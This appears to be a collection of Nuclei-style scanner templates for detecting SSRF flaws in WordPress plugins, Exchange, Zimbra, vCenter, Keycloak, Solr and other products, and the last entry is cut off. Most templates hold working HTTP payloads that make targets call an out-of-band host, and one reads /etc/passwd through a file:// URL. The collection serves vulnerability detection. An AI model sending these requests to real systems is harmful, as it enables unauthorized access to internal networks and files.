# Under Construction, Coming Soon & Maintenance Mode \< 1.1.2 - Server Side Request Forgery (SSRF)
## Description
- The includes/mc-get_lists.php file used the 'apiKey' POST parameter to create an https URL from it without sanitisation and called it with cURL, leading to a SSRF issue. The issue is exploitable via direct access to the affected file, and ucmm_mc_api AJAX call (available to both authenticated and unauthenticated users).

- severity - high
- tags - ssrf,wp,wp-plugin,wordpress,unauth,wpscan,packetstorm
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php HTTP/2
Host: {{Hostname}}
Origin: {{BaseURL}}
Content-Type: application/x-www-form-urlencoded

action=ucmm_mc_api&apiKey=-{{interactsh-url}}%2Ftest%2Ftest%2Ftest%3Fkey1%3Dval1%26dummy%3D

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# WordPress Themes - Code Injection
## Description
- Fifteen WordPress themes are susceptible to code injection using a version of epsilon-framework, due to lack of capability and CSRF nonce checks in AJAX actions.
- severity - high
- tags - wordpress,rce,ssrf,edb,wpscan
## Requests
### Step - 1
```
POST /wp-admin/admin-ajax.php?action=action_name HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded; charset=UTF-8

action=epsilon_framework_ajax_action&args%5Baction%5D%5B%5D=Requests&args%5Baction%5D%5B%5D=request_multiple&args%5Bargs%5D%5B0%5D%5Burl%5D=http://interact.sh

```
### Matchers

**Type - word**
- part - body
- words
    1. Interactsh Server
    2. protocol_version

**Type - status**
- status
    1. 200

---
# Wordpress XMLRPC Pingback detection
- severity - info
- tags - wordpress,ssrf,oast,xmlrpc
## Requests
### Step - 1
```
POST /xmlrpc.php HTTP/1.1
Host: {{Hostname}}

<methodCall>
  <methodName>pingback.ping</methodName>
  <params>
    <param>
      <value>
        <string>http://{{interactsh-url}}</string>
      </value>
    </param>
    <param>
      <value>
        <string>{{BaseURL}}/?p=1</string>
      </value>
    </param>
  </params>
</methodCall>

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Wordpress Oembed Proxy SSRF
- severity - medium
- tags - wordpress,ssrf,oast,proxy
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-json/oembed/1.0/proxy?url=http://{{interactsh-url}}/
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Wordpress W3C Total Cache \<= 0.9.4 - Server Side Request Forgery (SSRF)
## Description
- The W3 Total Cache WordPress plugin was affected by an Unauthenticated Server Side Request Forgery (SSRF) security vulnerability.

- severity - medium
- tags - wordpress,wp-plugin,cache,ssrf,wp
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/w3-total-cache/pub/minify.php?file=yygpKbDS1y9Ky9TLSy0uLi3Wyy9KB3NLKkqUM4CyxUDpxKzECr30_Pz0nNTEgsxiveT8XAA.css
### Matchers

**Type - word**
- part - body
- words
    1. NessusFileIncludeTest

---
# Atlassian Confluence \< 5.8.6 Server-Side Request Forgery
## Description
- Atlassian Confluence \< 5.8.6 is affected by a blind server-side request forgery vulnerability in the widgetconnector plugin.
- severity - medium
- tags - confluence,atlassian,ssrf,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/rest/sharelinks/1.0/link?url=https://{{interactsh-url}}/
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- part - body
- words
    1. faviconURL
    2. domain
- condition - and

**Type - status**
- status
    1. 200

---
# XMLRPC Pingback SSRF
- severity - high
- tags - xmlrpc,hackerone,ssrf,generic
## Requests
### Step - 1
```
POST /xmlrpc/pingback HTTP/1.1
Host: {{Hostname}}
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8

<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
<methodName>pingback.ping</methodName>
<params>
<param>
<value>http://{{interactsh-url}}</value>
</param>
</params>
</methodCall>

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# OOB Request Based Interaction
## Description
- The remote server fetched a spoofed DNS Name from the request.
- severity - info
- tags - oast,ssrf,generic
## Requests
### Step - 1
```
GET / HTTP/1.1
Host: {{interactsh-url}}
Cache-Control: no-transform
Accept: */*


```
### Step - 2
```
GET / HTTP/1.1
Host: @{{interactsh-url}}
Cache-Control: no-transform
Accept: */*


```
### Step - 3
```
GET http://{{interactsh-url}}/ HTTP/1.1
Host: {{Hostname}}
Cache-Control: no-transform
Accept: */*


```
### Step - 4
```
GET @{{interactsh-url}}/ HTTP/1.1
Host: {{Hostname}}
Cache-Control: no-transform
Accept: */*


```
### Step - 5
```
GET {{interactsh-url}}:80/ HTTP/1.1
Host: {{Hostname}}
Cache-Control: no-transform
Accept: */*


```
### Matchers

**Type - word**
- part - interactsh_protocol
- name - http
- words
    1. http

**Type - word**
- part - interactsh_protocol
- name - dns
- words
    1. dns

---
# Parameter Based Generic OOB Interaction
## Description
- The remote server fetched a spoofed URL from the request parameters.
- severity - info
- tags - oast,ssrf,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}/?u=http://{{interactsh-url}}/&href=http://{{interactsh-url}}/&action=http://{{interactsh-url}}/&host={{interactsh-url}}&http_host={{interactsh-url}}&email=root@{{interactsh-url}}&url=http://{{interactsh-url}}/&load=http://{{interactsh-url}}/&preview=http://{{interactsh-url}}/&target=http://{{interactsh-url}}/&proxy=http://{{interactsh-url}}/&from=http://{{interactsh-url}}/&src=http://{{interactsh-url}}/&ref=http://{{interactsh-url}}/&referrer=http://{{interactsh-url}}/
### Matchers

**Type - word**
- part - interactsh_protocol
- name - http
- words
    1. http

---
# Header Based Generic OOB Interaction
## Description
- The remote server fetched a spoofed URL from the request headers.
- severity - info
- tags - oast,ssrf,generic
## Requests
- Method - GET
### URL
- {{BaseURL}}
### Matchers

**Type - word**
- part - interactsh_protocol
- name - http
- words
    1. http

**Type - word**
- part - interactsh_protocol
- name - dns
- words
    1. dns

---
# JAMF Blind XXE / SSRF
- severity - medium
- tags - xxe,ssrf,jamf
## Requests
### Step - 1
```
POST /client HTTP/1.1
Host: {{Hostname}}
Content-Type: application/xml

<?xml version='1.0' encoding='UTF-8' standalone="no"?>
<!DOCTYPE jamfMessage SYSTEM "http://{{interactsh-url}}/test.xml">
<ns2:jamfMessage xmlns:ns3="http://www.jamfsoftware.com/JAMFCommunicationSettings" xmlns:ns2="http://www.jamfsoftware.com/JAMFMessage">
  <device>
    <uuid>&test;</uuid>
    <macAddresses />
  </device>
  <application>com.jamfsoftware.jamfdistributionserver</application>
  <messageTimestamp>{{unix_time()}}</messageTimestamp>
  <content xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xsi:type="ns2:ResponseContent">
    <uuid>00000000-0000-0000-0000-000000000000</uuid>
    <commandType>com.jamfsoftware.jamf.distributionserverinventoryrequest</commandType>
    <status>
      <code>1999</code>
      <timestamp>{{unix_time()}}</timestamp>
    </status>
    <commandData>
      <distributionServerInventory>
        <ns2:distributionServerID>34</ns2:distributionServerID>
      </distributionServerInventory>
    </commandData>
  </content>
</ns2:jamfMessage>

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- words
    1. com.jamfsoftware.jss

---
# Hasura GraphQL Engine - SSRF Side Request Forgery
- severity - high
- tags - hasura,ssrf,graphql
## Requests
### Step - 1
```
POST /v1/query HTTP/1.1
Host: {{Hostname}}
Content-Type: application/json
Accept: */*

{
   "type":"bulk",
   "args":[
      {
         "type":"add_remote_schema",
         "args":{
            "name":"test",
            "definition":{
               "url":"https://{{interactsh-url}}",
               "headers":[
               ],
               "timeout_seconds":60,
               "forward_client_headers":true
            }
         }
      }
   ]
}

```
### Matchers

**Type - status**
- status
    1. 400

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Umbraco 8.14.1 - baseUrl Server-Side Request Forgery (SSRF)
## Description
- Umbraco 8.1.4.1 allows attackers to use the baseUrl parameter to several programs to perform a server-side request forgery (SSRF) attack.
- severity - medium
- tags - oast,edb,ssrf,umbraco
## Requests
- Method - GET
### URL
- {{BaseURL}}/umbraco/BackOffice/Api/Help/GetContextHelpForPage?section=content&tree=undefined&baseUrl=http://{{interactsh-url}}
- {{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardContent?section=TryToAvoidGetCacheItem111&baseUrl=http://{{interactsh-url}}/
- {{BaseURL}}/umbraco/backoffice/UmbracoApi/Dashboard/GetRemoteDashboardCss?section=AvoidGetCacheItem&baseUrl=http://{{interactsh-url}}/
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - dsl**
- dsl
    1. len(body_1)==0
    2. len(body_2)==0
    3. len(body_3)==0

---
# WSO2 \<5.8.0 - Server Side Request Forgery
## Description
- WSO2 prior to version 5.8.0 is susceptible to a server-side request forgery vulnerability. This vulnerability can be exploited by misusing the UI gadgets loading capability of the shindig web application. An attacker can alter a specific URL in the request causing the server to initiate a GET request to the altered URL.

- severity - medium
- tags - ssrf,wso2,shindig
## Requests
- Method - GET
### URL
- {{BaseURL}}/shindig/gadgets/proxy?container=default&url=http://oast.pro
### Matchers

**Type - word**
- words
    1. Interactsh Server

**Type - status**
- status
    1. 200

---
# Web Page Test - Server Side Request Forgery (SSRF)
- severity - high
- tags - ssrf,webpagetest,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/jpeginfo/jpeginfo.php?url={{interactsh-url}}
### Matchers

**Type - word**
- words
    1. File is not a JPEG Image

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# MicroStrategy tinyurl - Server-Side Request Forgery (Blind)
## Description
- Blind server-side (SSRF) request forgery vulnerability on MicroStrategy URL shortener.
- severity - high
- tags - microstrategy,ssrf
## Requests
- Method - GET
### URL
- {{BaseURL}}/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
- {{BaseURL}}/MicroStrategy/servlet/taskProc?taskId=shortURL&taskEnv=xml&taskContentType=xml&srcURL=https://google.com
### Matchers

**Type - word**
- words
    1. taskResponse
    2. The source URL is not valid
- condition - and
- part - body

---
# Zimbra Collaboration Suite - Server-Side Request Forgery
## Description
- Zimbra Collaboration Suite (ZCS) allows remote unauthenticated attackers to cause the product to include content returned by third-party servers and use it as its own code.
- severity - critical
- tags - zimbra,ssrf,oast
## Requests
### Step - 1
```
GET /service/error/sfdc_preauth.jsp?session=s&userid=1&server=http://{{interactsh-url}}%23.salesforce.com/ HTTP/1.1
Host: {{Hostname}}
Accept: */*

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# VMware vCenter - Server-Side Request Forgery/Local File Inclusion/Cross-Site Scripting
## Description
- VMware vCenter 7.0.2.00100 is susceptible to multiple vulnerabilities including server-side request forgery, local file inclusion, and cross-site scripting.
- severity - critical
- tags - ssrf,lfi,xss,oast,vcenter,vmware
## Requests
- Method - GET
### URL
- {{BaseURL}}/ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url=https://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - status**
- status
    1. 200

---
# Selea Targa IP OCR-ANPR Camera - Unauthenticated SSRF
## Description
- Unauthenticated Server-Side Request Forgery (SSRF) vulnerability exists in the Selea ANPR camera within several functionalities. The application parses user supplied data in the POST JSON parameters 'ipnotify_address' and 'url' to construct an image request or check DNS for IP notification. Since no validation is carried out on the parameters, an attacker can specify an external domain and force the application to make an HTTP request to an arbitrary destination host. This can be used by an external attacker for example to bypass firewalls and initiate a service and network enumeration on the internal network through the affected application.
- severity - high
- tags - targa,ssrf,oast,iot,camera,selea
## Requests
### Step - 1
```
POST /cps/test_backup_server?ACTION=TEST_IP&NOCONTINUE=TRUE HTTP/1.1
Host: {{Hostname}}
content-type: application/json
Accept: */*

{"test_type":"ip","test_debug":false,"ipnotify_type":"http/get","ipnotify_address":"http://{{interactsh-url}}","ipnotify_username":"","ipnotify_password":"","ipnotify_port":"0","ipnotify_content_type":"","ipnotify_template":""}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Full-read SSRF in Spring Cloud Netflix (Hystrix Dashboard)
## Description
- Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6, and older unsupported versions allow applications to use the Hystrix Dashboard proxy.stream endpoint to make requests to any server reachable by the server hosting the dashboard. A malicious user, or attacker, can send a request to other servers that should not be exposed publicly.
- severity - medium
- tags - cve,cve2020,ssrf,springcloud
## Requests
- Method - GET
### URL
- {{BaseURL}}/proxy.stream?origin=http://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- part - header
- words
    1. Jelly

**Type - status**
- status
    1. 200

---
# Emby Server Server-Side Request Forgery
## Description
- Emby Server before 4.5.0 allows server-side request forgery (SSRF) via the Items/RemoteSearch/Image ImageURL parameter.
- severity - critical
- tags - cve,cve2020,emby,jellyfin,ssrf
## Requests
- Method - GET
### URL
- {{BaseURL}}/Items/RemoteSearch/Image?ProviderName=TheMovieDB&ImageURL=http://notburpcollaborator.net
### Matchers

**Type - status**
- status
    1. 500

**Type - word**
- words
    1. Name or service not known
- part - body

**Type - word**
- words
    1. text/plain
- part - header

---
# Wordpress Plugin Canto 1.3.0 - Blind SSRF (Unauthenticated)
## Description
- The Canto plugin 1.3.0 for WordPress contains a blind SSRF vulnerability. It allows an unauthenticated attacker to make a request to any internal and external server via /includes/lib/detail.php?subdomain=SSRF.
- severity - medium
- tags - cve,cve2020,ssrf,wordpress,wp-plugin,oast,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/canto/includes/lib/detail.php?subdomain={{interactsh-url}}
- {{BaseURL}}/wp-content/plugins/canto/includes/lib/get.php?subdomain={{interactsh-url}}
- {{BaseURL}}/wp-content/plugins/canto/includes/lib/tree.php?subdomain={{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Keycloak 12.0.1 - request_uri  Blind Server-Side Request Forgery (SSRF)
## Description
- Keycloak 12.0.1 and below allow an attacker to force the server to request an unverified URL using the OIDC parameter request_uri. This allows an attacker to execute a server-side request forgery (SSRF) attack.
- severity - medium
- tags - keycloak,ssrf,oast,cve,cve2020,blind,packetstorm,edb
## Requests
- Method - GET
### URL
- {{BaseURL}}/auth/realms/master/protocol/openid-connect/auth?scope=openid&response_type=code&redirect_uri=valid&state=cfx&nonce=cfx&client_id=security-admin-console&request_uri=http://{{interactsh-url}}/
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Canvas LMS Unauthenticated Blind SSRF
## Description
- Server-Side Request Forgery in Canvas LMS 2020-07-29 allows a remote, unauthenticated attacker to cause the Canvas application to perform HTTP GET requests to arbitrary domains.
- severity - medium
- tags - cve,cve2020,ssrf,oast,blind,tenable
## Requests
- Method - GET
### URL
- {{BaseURL}}/external_content/retrieve/oembed?endpoint=http://{{interactsh-url}}&url=foo
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Zimbra Collaboration Suite \< 8.8.15 Patch 7 - Server-Side Request Forgery
## Description
- Zimbra Collaboration Suite (ZCS) before 8.8.15 Patch 7 is susceptible to server-side request forgery when WebEx zimlet is installed and zimlet JSP is enabled.
- severity - critical
- tags - cve,cve2020,zimbra,ssrf,oast
## Requests
### Step - 1
```
GET /zimlet/com_zimbra_webex/httpPost.jsp?companyId=http://{{interactsh-url}}%23 HTTP/1.1
Host: {{Hostname}}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# SAP - Unauthenticated Blind SSRF
## Description
- SAP BusinessObjects Business Intelligence Platform (Web Services) versions - 410, 420, 430, allows an unauthenticated attacker to inject arbitrary values as CMS parameters to perform lookups on the internal network which is otherwise not accessible externally. On successful exploitation, attacker can scan internal network to determine internal infrastructure and gather information for further attacks like remote file inclusion, retrieve server files, bypass firewall and force the vulnerable server to perform malicious requests, resulting in a Server-Side Request Forgery vulnerability.

- severity - medium
- tags - cve,cve2020,sap,ssrf,oast,unauth
## Requests
### Step - 1
```
POST /AdminTools/querybuilder/logon?framework= HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

aps={{interactsh-url}}&usr=anything&pwd=anything&aut=secEnterprise&main_page=ie.jsp&new_pass_page=newpwdform.jsp&exit_page=logonform.jsp

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. dns

**Type - word**
- part - location
- words
    1. {{BaseURL}}/AdminTools/querybuilder/logonform.jsp

---
# Import XML & RSS Feeds WordPress Plugin \<= 2.0.1 Server-Side Request Forgery
## Description
- WordPress plugin Import XML and RSS Feeds (import-xml-feed) plugin 2.0.1 contains a server-side request forgery (SSRF) vulnerability via the data parameter in a moove_read_xml action.
- severity - critical
- tags - cve,cve2020,wordpress,wp-plugin,ssrf
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/wp-admin/admin-ajax.php?action=moove_read_xml
  - type=url&data=http%3A%2F%2F{{interactsh-url}}%2F&xmlaction=preview&node=0
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Unauthenticated Blind SSRF in Oracle EBS
## Description
- https://medium.com/@x41x41x41/unauthenticated-ssrf-in-oracle-ebs-765bd789a145
- severity - medium
- tags - cve,cve2018,oracle,ebs,ssrf,blind
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/OA_HTML/lcmServiceController.jsp
  - <!DOCTYPE root PUBLIC "-//B/A/EN" "http://interact.sh">
### Matchers

**Type - word**
- words
    1. Unexpected text in DTD
- part - body

**Type - status**
- status
    1. 200

---
# D-Link Central WifiManager - Server-Side Request Forgery
## Description
- D-Link Central WifiManager is susceptible to server-side request forgery. The MailConnect feature on D-Link Central WiFiManager CWM-100 1.03 r0098 devices is intended to check a connection to an SMTP server but actually allows outbound TCP to any port on any IP address, as demonstrated by an index.php/System/MailConnect/host/127.0.0.1/port/22/secure/ URI. This can undermine accountability of where scan or connections actually came from and or bypass the FW etc. This can be automated via script or using a browser.
- severity - high
- tags - seclists,packetstorm,cve,cve2018,dlink,ssrf,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/index.php/System/MailConnect/host/{{interactsh-url}}/port/80/secure/
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Jenkins GitHub Plugin \<=1.29.1 - Server-Side Request Forgery
## Description
- Jenkins GitHub Plugin 1.29.1 and earlier is susceptible to server-side request forgery via GitHubTokenCredentialsCreator.java, which allows attackers to leverage attacker-specified credentials IDs obtained through another method and capture the credentials stored in Jenkins.

- severity - high
- tags - cve,cve2018,jenkins,ssrf,oast,github
## Requests
- Method - GET
### URL
- {{BaseURL}}/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Responsive filemanager 9.13.1 Server-Side Request Forgery
## Description
- Responsive filemanager 9.13.1 is susceptible to server-side request forgery in upload.php via the url parameter.
- severity - critical
- tags - cve,cve2018,ssrf,lfi,packetstorm,edb
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/filemanager/upload.php
  - fldr=&url=file:///etc/passwd
### Matchers

**Type - regex**
- regex
    1. root:.*:0:0:
- part - body

---
# DotNetNuke (DNN) ImageHandler \<9.2.0 - Server-Side Request Forgery
## Description
- DotNetNuke (aka DNN) before 9.2.0 suffers from a server-side request forgery vulnerability in the DnnImageHandler class. Attackers may be able to access information about internal network resources.
- severity - high
- tags - dnn,dotnetnuke,hackerone,cve,cve2017,oast,ssrf
## Requests
- Method - GET
### URL
- {{BaseURL}}/DnnImageHandler.ashx?mode=file&url=http://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - status**
- status
    1. 500

---
# Graphite \<=1.1.5 - Server-Side Request Forgery
## Description
- Graphite's send_email in graphite-web/webapp/graphite/composer/views.py in versions up to 1.1.5 is vulnerable to server-side request forgery (SSR)F. The vulnerable SSRF endpoint can be used by an attacker to have the Graphite web server request any resource. The response to this SSRF request is encoded into an image file and then sent to an email address that can be supplied by the attacker. Thus, an attacker can exfiltrate any information.

- severity - high
- tags - cve,cve2017,graphite,ssrf,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/composer/send_email?to={{rand_text_alpha(4)}}@{{rand_text_alpha(4)}}&url=http://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Atlassian Jira IconURIServlet - Cross-Site Scripting/Server-Side Request Forgery
## Description
- The Atlassian Jira IconUriServlet of the OAuth Plugin from version 1.3.0 before version 1.9.12 and from version 2.0.0 before version 2.0.4 contains a cross-site scripting vulnerability which allows remote attackers to access the content of internal network resources and/or perform an attack via Server Side Request Forgery.
- severity - medium
- tags - cve,cve2017,atlassian,jira,ssrf,oast
## Requests
### Step - 1
```
GET /plugins/servlet/oauth/users/icon-uri?consumerUri=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# WordPress Qards - Cross-Site Scripting
## Description
- WordPress Qards through 2017-10-11 contains a cross-site scripting vulnerability via a remote document specified in the URL parameter to html2canvasproxy.php.
- severity - medium
- tags - wp-plugin,oast,wpscan,cve,cve2017,wordpress,ssrf,xss
## Requests
- Method - GET
### URL
- {{BaseURL}}/wp-content/plugins/qards/html2canvasproxy.php?url=https://{{interactsh-url}}
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- part - body
- words
    1. console.log

---
# Oracle Weblogic - SSRF in SearchPublicRegistries.jsp
## Description
- An unspecified vulnerability in the Oracle WebLogic Server component in Oracle Fusion Middleware 10.0.2.0 and 10.3.6.0 allows remote attackers to affect confidentiality via vectors related to WLS - Web Services.
- severity - medium
- tags - cve,cve2014,weblogic,oracle,ssrf,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&txtSearchname=sdf&txtSearchkey=&txtSearchfor=&selfor=Business+location&btnSubmit=Search&operator=http://{{interactsh-url}}
### Matchers

**Type - status**
- status
    1. 200

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Jellyfin 10.7.2 - SSRF
## Description
- Jellyfin is a free software media system. Versions 10.7.2 and below are vulnerable to unauthenticated Server-Side Request Forgery (SSRF) attacks via the imageUrl parameter.

- severity - medium
- tags - cve,cve2021,ssrf,jellyfin,oast
## Requests
- Method - GET
### URL
- {{BaseURL}}/Images/Remote?imageUrl=http://interact.sh/
- {{BaseURL}}/Items/RemoteSearch/Image?ImageUrl=http://interact.sh/&ProviderName=TheMovieDB
### Matchers

**Type - word**
- part - body
- words
    1. \<h1> Interactsh Server \</h1>

---
# Apache \<= 2.4.48 - Mod_Proxy SSRF
## Description
- Apache 2.4.48 and below contain an issue where uri-path can cause mod_proxy to forward the request to an origin server chosen by the remote user.
- severity - critical
- tags - cve,cve2021,ssrf,apache,mod-proxy,kev
## Requests
- Method - GET
### URL
- {{BaseURL}}/?unix:{{repeat("A", 7701)}}|http://interact.sh/
### Matchers

**Type - word**
- words
    1. Interactsh Server

---
# Microsoft Exchange Server SSRF Vulnerability
## Description
- This vulnerability is part of an attack chain that could allow remote code execution on Microsoft Exchange Server. The initial attack requires the ability to make an untrusted connection to Exchange server port 443. Other portions of the chain can be triggered if an attacker already has access or can convince an administrator to open a malicious file. Be aware his CVE ID is unique from CVE-2021-26412, CVE-2021-26854, CVE-2021-26857, CVE-2021-26858, CVE-2021-27065, and CVE-2021-27078.
- severity - critical
- tags - cve,cve2021,ssrf,rce,exchange,oast,microsoft,kev
## Requests
### Step - 1
```
GET /owa/auth/x.js HTTP/1.1
Host: {{Hostname}}
Cookie: X-AnonResource=true; X-AnonResource-Backend={{interactsh-url}}/ecp/default.flt?~3;

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

---
# Exchange Server - Remote Code Execution
## Description
- Microsoft Exchange Server is vulnerable to a remote code execution vulnerability. This CVE ID is unique from CVE-2021-31196, CVE-2021-31206.

- severity - critical
- tags - cve,cve2021,ssrf,rce,exchange,kev
## Requests
- Method - GET
### URL
- {{BaseURL}}/autodiscover/autodiscover.json?@test.com/owa/?&Email=autodiscover/autodiscover.json%3F@test.com
- {{BaseURL}}/autodiscover/autodiscover.json?@test.com/mapi/nspi/?&Email=autodiscover/autodiscover.json%3F@test.com
### Matchers

**Type - word**
- part - body
- condition - or
- words
    1. Microsoft.Exchange.Clients.Owa2.Server.Core.OwaADUserNotFoundException
    2. Exchange MAPI/HTTP Connectivity Endpoint

---
# Onair2 \< 3.9.9.2 & KenthaRadio \< 2.0.2 - Remote File Inclusion/Server-Side Request Forgery
## Description
- Onair2 \< 3.9.9.2 and KenthaRadio \< 2.0.2  have exposed proxy functionality to unauthenticated users. Sending requests to this proxy functionality will have the web server fetch and display the content from any URI, allowing remote file inclusion and server-side request forgery.
- severity - critical
- tags - wordpress,lfi,ssrf,oast,wpscan,cve,cve2021
## Requests
### Step - 1
```
GET /?qtproxycall=http://{{interactsh-url}} HTTP/1.1
Host: {{Hostname}}
Origin: {{BaseURL}}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - status**
- status
    1. 200

---
# VMWare Workspace ONE UEM - Server-Side Request Forgery
## Description
- VMware Workspace ONE UEM console 20.0.8 prior to 20.0.8.37, 20.11.0 prior to 20.11.0.40, 21.2.0 prior to 21.2.0.27, and 21.5.0 prior to 21.5.0.37 contain a server-side request forgery vulnerability. This issue may allow a malicious actor with network access to UEM to send their requests without authentication and to gain access to sensitive information.
- severity - high
- tags - cve,cve2021,vmware,workspace,ssrf
## Requests
- Method - GET
### URL
- {{BaseURL}}/Catalog/BlobHandler.ashx?Url=YQB3AGUAdgAyADoAawB2ADAAOgB4AGwAawBiAEoAbwB5AGMAVwB0AFEAMwB6ADMAbABLADoARQBKAGYAYgBHAE4ATgBDADUARQBBAG0AZQBZAE4AUwBiAFoAVgBZAHYAZwBEAHYAdQBKAFgATQArAFUATQBkAGcAZAByAGMAMgByAEUAQwByAGIAcgBmAFQAVgB3AD0A
### Matchers

**Type - word**
- words
    1. Interactsh Server

**Type - status**
- status
    1. 200

---
# Gitlab CE/EE 10.5 - Server-Side Request Forgery
## Description
- GitLab CE/EE versions starting from 10.5 are susceptible to a server-side request forgery vulnerability when requests to the internal network for webhooks are enabled, even on a GitLab instance where registration is limited. The same vulnerability actually spans multiple CVEs, due to similar reports that were fixed across separate patches. These CVEs are:
- CVE-2021-39935
- CVE-2021-22214
- CVE-2021-22175

- severity - high
- tags - cve,cve2021,gitlab,ssrf
## Requests
- Method - POST
- Method - POST
### URL
- {{BaseURL}}/api/v4/ci/lint?include_merged_yaml=true
  - {"content": "include:\n  remote: http://127.0.0.1:9100/test.yml"}

### Matchers

**Type - word**
- part - body
- words
    1. does not have valid YAML syntax

---
# IBM WebSphere HCL Digital Experience - Server-Side Request Forgery
## Description
- IBM WebSphere HCL Digital Experience is vulnerable to server-side request forgery that impacts on-premise deployments and containers.

- severity - high
- tags - cve,cve2021,hcl,ibm,ssrf,websphere
## Requests
- Method - GET
### URL
- {{BaseURL}}/docpicker/internal_proxy/http/interact.sh
- {{BaseURL}}/wps/PA_WCM_Authoring_UI/proxy/http/interact.sh
### Matchers

**Type - word**
- words
    1. Interactsh Server

**Type - status**
- status
    1. 200

---
# Adminer \<4.7.9 - Server-Side Request Forgery
## Description
- Adminer from version 4.0.0 through 4.7.8 is susceptible to server-side request forgery due to its use of verbose error messages. Users of Adminer versions bundling all drivers (e.g. `adminer.php`) are affected.
- severity - high
- tags - cve,cve2021,adminer,ssrf
## Requests
- Method - GET
### URL
- {{BaseURL}}/adminer?elastic=interact.sh&username=
### Matchers

**Type - word**
- part - body
- words
    1. &lt;title&gt;400 - Bad Request&lt;/title&gt;

**Type - status**
- status
    1. 403

---
# Geoserver - Server-Side Request Forgery
## Description
- GeoServer through 2.18.5 and 2.19.x through 2.19.2 allows server-side request forgery via the option for setting a proxy host.
- severity - high
- tags - cve,cve2021,ssrf,geoserver
## Requests
### Step - 1
```
POST /geoserver/TestWfsPost HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

form_hf_0=&url=http://{{interactsh-url}}/geoserver/../&body=&username=&password=

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- words
    1. \<html>\<head>\</head>\<body>

**Type - status**
- status
    1. 200

---
# MinIO Browser API - Server-Side Request Forgery
## Description
- MinIO Browser API before version RELEASE.2021-01-30T00-20-58Z contains a server-side request forgery vulnerability.
- severity - high
- tags - cve,cve2021,minio,ssrf,oast
## Requests
### Step - 1
```
POST /minio/webrpc HTTP/1.1
Host: {{interactsh-url}}
Content-Type: application/json
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2656.18 Safari/537.36
Content-Length: 76

{"id":1,"jsonrpc":"2.0","params":{"token":  "Test"},"method":"web.LoginSTS"}

```
### Matchers

**Type - word**
- part - interactsh_protocol
- words
    1. http

**Type - word**
- words
    1. We encountered an internal error

---
# Apache Solr \<=8.8.1 - Server-Side Request Forgery
## Description
- Apache Solr versions 8.8.1 and prior contain a server-side request forgery vulnerability. The ReplicationHandler (normally registered at "/replication" under a Solr core) in Apache Solr has a "masterUrl" (also "leaderUrl" alias) parameter that is used to designate another ReplicationHandler on another Solr core to replicate index data into the local core. To prevent a SSRF vulnerability, Solr ought to check these parameters against a similar configuration it uses for the "shards" parameter.
- severity - critical
- tags - cve,cve2021,apache,solr,ssrf
